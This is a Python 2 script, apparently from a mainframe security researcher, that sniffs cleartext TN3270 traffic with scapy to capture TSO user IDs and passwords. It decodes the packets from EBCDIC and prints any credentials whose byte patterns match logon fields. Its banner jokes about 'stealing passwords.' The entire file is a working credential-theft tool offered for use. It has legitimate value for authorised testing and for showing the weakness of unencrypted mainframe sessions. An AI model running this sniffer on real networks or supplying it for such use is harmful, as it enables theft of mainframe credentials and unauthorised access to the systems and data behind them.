#!/usr/bin/env python


##################################################################
# Script to capture TSO login credentials			 #
#                                                                #
# Requirements: Python, scapy and IP/Port of mainframe           #
# Created by: Soldier of Fortran (@mainframed767)                #
# Usage: Given an interface, IP and port this script will 	 #
# try to sniff mainframe user IDs and  passwords sent over       #
# cleartext using TN3270 (tested against x3270 and TN3270X)      #
#                                                                #
# Copyright GPL 2012                                             #
##################################################################

from scapy.all import * #needed for scapy
import argparse #needed for argument parsing

print '''
          ____________________________
        /|............................|
       | |:         Mainframe        :|
       | |:     Password Sniffer     :|
       | |:     ,-.   _____   ,-.    :|
       | |:    ( `)) [_____] ( `))   :|
       |v|:     `-`   ' ' '   `-`    :|
       |||:     ,______________.     :|
       |||...../::::o::::::o::::\.....|
       |^|..../:::O::::::::::O:::\....|
       |/`---/--------------------`---|
       `.___/ /====/ /=//=/ /====/____/
            `--------------------'
       Stealing passwords like its 1985
'''


#start argument parser
parser = argparse.ArgumentParser(description='MF Sniffer - A script to capture TSO user ID and password',epilog='PRESS PLAY ON TAPE')
parser.add_argument('-a','--ip', help='Mainframe TN3270 server IP address',dest='ip')
parser.add_argument('-p','--port', help='Mainframe TN3270 server listening port (e.g 23, 2323, 623, etc)',dest='port')
parser.add_argument('-i','--interface', help='network interface to listen on',dest='interface')
args = parser.parse_args()
results = parser.parse_args() # put the arg results in the variable results


#for now you need to set this manually
interface = results.interface
port = results.port
ip_address = results.ip

print "-{X}- Mainframe: ", ip_address,':',port
print "-{X}- Sniffer started on interface:", interface



#EBCDIC converter to ignore non-ascii chars
# from http://www.pha.com.au/kb/index.php/Ebcdic.py
e2a = [
      0,  1,  2,  3,156,  9,134,127,151,141,142, 11, 12, 13, 14, 15,
     16, 17, 18, 19,157,133,  8,135, 24, 25,146,143, 28, 29, 30, 31,
    128,129,130,131,132, 10, 23, 27,136,137,138,139,140,  5,  6,  7,
    144,145, 22,147,148,149,150,  4,152,153,154,155, 20, 21,158, 26,
     32,160,161,162,163,164,165,166,167,168, 91, 46, 60, 40, 43, 33,
     38,169,170,171,172,173,174,175,176,177, 93, 36, 42, 41, 59, 94,
     45, 47,178,179,180,181,182,183,184,185,124, 44, 37, 95, 62, 63,
    186,187,188,189,190,191,192,193,194, 96, 58, 35, 64, 39, 61, 34,
    195, 97, 98, 99,100,101,102,103,104,105,196,197,198,199,200,201,
    202,106,107,108,109,110,111,112,113,114,203,204,205,206,207,208,
    209,126,115,116,117,118,119,120,121,122,210,211,212,213,214,215,
    216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,
    123, 65, 66, 67, 68, 69, 70, 71, 72, 73,232,233,234,235,236,237,
    125, 74, 75, 76, 77, 78, 79, 80, 81, 82,238,239,240,241,242,243,
     92,159, 83, 84, 85, 86, 87, 88, 89, 90,244,245,246,247,248,249,
     48, 49, 50, 51, 52, 53, 54, 55, 56, 57,250,251,252,253,254,255
]

def EbcdicToAscii(s):
    if type(s) != type(""):
        raise "Bad data", "Expected a string argument"

    if len(s) == 0:  return s

    new = ""

    for i in xrange(len(s)):
        new += chr(e2a[ord(s[i])])
    return new



def sniffTSO(pkt):
	raw=pkt.sprintf("%r,Raw.load%")
	dst=pkt.sprintf("%IP.dst%")
	dport=pkt.sprintf("%IP.dport%")
	if dst == ip_address and dport == port and raw.__len__() < 200:
		# If the destination and port match and the length of data is less than 200 chars 
		# convert the raw string to an ebcdic string so we can search, etc
		sniffed = EbcdicToAscii(raw[1:-1])
		#print "[+] Length is", raw.__len__()
		#print sniffed
		#print "[+] Ordinals: ",
		for i in xrange(len(raw)):
		#Logons start with 125 193 215 17 64 90 ordinals so we check for those
			if ord(raw[i]) == 125 and \
			   ord(raw[i+1]) == 193 and \
			   ord(raw[i+2]) == 215 and \
			   ord(raw[i+3]) == 17 and \
			   ord(raw[i+4]) == 64 and \
			   ord(raw[i+5]) == 90:
				print "-{X}- Mainframe UserID:",sniffed[i+5:-1]
		#Password always contain ordinals 125 201 ### 17 201 195 where ### can be anything
			if ord(raw[i]) == 125 and \
			   ord(raw[i+1]) == 201 and \
			   ord(raw[i+3]) == 17 and \
			   ord(raw[i+4]) == 201 and \
			   ord(raw[i+5]) == 195:
				print "-{X}- Mainframe Password:",sniffed[i+5:-1]
    		#print ord(raw[i]),
	#print ""	
		

# Start scapy sniffer on interface and 
# pass all packets to the function sniffTSO
sniff(iface=interface, prn=sniffTSO)

